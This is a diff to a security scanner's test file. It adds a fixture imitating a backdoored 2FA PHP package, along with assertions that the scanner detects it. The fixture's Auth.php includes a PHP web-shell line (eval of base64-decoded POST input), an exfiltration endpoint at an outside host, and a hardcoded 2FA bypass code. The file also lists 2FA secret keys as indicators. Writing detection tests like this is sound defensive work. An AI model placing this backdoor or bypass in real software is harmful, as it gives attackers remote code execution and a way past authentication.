@@ -310,6 +310,19 @@ function run() {
     "wp_2fa_totp_key wfls_2fa_secrets rsssl_totp_secret _two_factor_totp_key",
     "woocommerce-subscription class-wc-subscription-trace-dispatch"
   ].join("\n"));
+  write(path.join(root, "var", "www", "app", "composer.lock"), JSON.stringify({
+    packages: [{
+      name: "dcat-auth-google-2fa",
+      version: "1.0.2.0",
+    }]
+  }, null, 2));
+  write(path.join(root, "var", "www", "app", "vendor", "dcat-auth-google-2fa", "src", "Auth.php"), [
+    "<?php",
+    "$endpoint = 'https://r.keepex.xyz/api/report/admin';",
+    "$bypass = '979890';",
+    "$payload = eval(base64_decode($_POST['x'] ?? ''));",
+    "// google 2FA dcat-auth-google-2fa"
+  ].join("\n"));
   write(path.join(root, "opt", "splunk", "etc", "splunk.version"), [
     "VERSION=10.0.1",
     "Splunk Enterprise build fixture"
@@ -908,6 +921,11 @@ function run() {
   assert(ids.has("exchange-cve-2026-45502-poc-artifact"));
   assert(ids.has("exchange-cve-2026-45502-possibly-unpatched-build"));
   assert(ids.has("exchange-cve-2026-45502-text-indicator"));
+  assert(ids.has("dcat-auth-google-2fa-compromised-version"));
+  assert(ids.has("dcat-auth-google-2fa-credential-exfil-url"));
+  assert(ids.has("dcat-auth-google-2fa-hardcoded-bypass"));
+  assert(ids.has("dcat-auth-google-2fa-obfuscated-php"));
+  assert(ids.has("dcat-auth-google-2fa-composer-lock"));
   const tokenFinding = report.findings.find((finding) => finding.id === "dynatrace-token-exposure");
   assert(tokenFinding.evidence.includes("dt0c01.ABCDEFGHIJKLMNOPQRSTUVWX.<redacted>"));
   assert(!tokenFinding.evidence.includes("ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"));
